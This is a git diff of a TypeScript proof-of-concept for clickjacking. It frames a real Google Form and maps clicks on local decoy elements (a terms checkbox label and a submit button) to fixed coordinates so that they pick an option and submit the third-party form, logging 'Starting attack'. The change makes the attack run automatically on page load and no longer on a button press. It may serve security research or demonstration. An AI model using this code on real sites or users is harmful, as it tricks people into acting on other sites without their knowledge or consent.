@@ -1,39 +1,44 @@
 import { Frame } from './frame/index.ts'
 import { sleep } from './utils.ts'
 
-const runButton = document.getElementById('run') as HTMLButtonElement
 const outputElement = document.getElementById('output') as HTMLElement
 
-const decoyButton = document.getElementById('decoy-button') as HTMLButtonElement
-const decoyLink = document.getElementById('decoy-link') as HTMLAnchorElement
-const decoyElements = [decoyButton, decoyLink]
+const testForm = document.getElementById('test-form') as HTMLFormElement
+const termsLabel = document.getElementById('terms-label') as HTMLLabelElement
+const termsCheckbox = document.getElementById(
+  'terms-checkbox'
+) as HTMLInputElement
+const submitButton = document.getElementById(
+  'submit-button'
+) as HTMLInputElement
+
+testForm.addEventListener('submit', (event) => {
+  event.preventDefault()
+  testForm.reset()
+})
 
 async function main() {
-  runButton.disabled = true
-  outputElement.innerText = ''
-  const log = (msg: string) => {
-    outputElement.innerText += msg + '\n'
-    console.log(msg)
-  }
-
-  log('Starting attack')
+  console.log('Starting attack')
 
   using frame = new Frame(1000, 1000)
   await frame.load('https://forms.gle/ZEBK8v684ARcuh1o9')
-  log('Frame loaded')
+  console.log('Frame loaded')
 
-  await frame.elementClick(decoyButton, { x: 215, y: 320 })
-  log('Clicked option')
-  await frame.elementClick(decoyElements, { x: 226, y: 397 })
-  log('Clicked submit')
+  testForm.reset()
+  termsCheckbox.disabled = false
+  submitButton.disabled = false
+
+  await frame.elementClick(termsLabel, { x: 215, y: 320 })
+  console.log('Clicked option')
+  await frame.elementClick(submitButton, { x: 226, y: 397 })
+  console.log('Clicked submit')
 
   await sleep(1000) // Wait for the form to submit
 
-  log('Success')
-  runButton.disabled = false
+  console.log('Success')
 
   const iframe = frame.retriveFrame()
-  iframe.style = ''
+  iframe.style = 'width: 400px; height: 350px'
 }
 
-runButton.addEventListener('click', main)
+main()
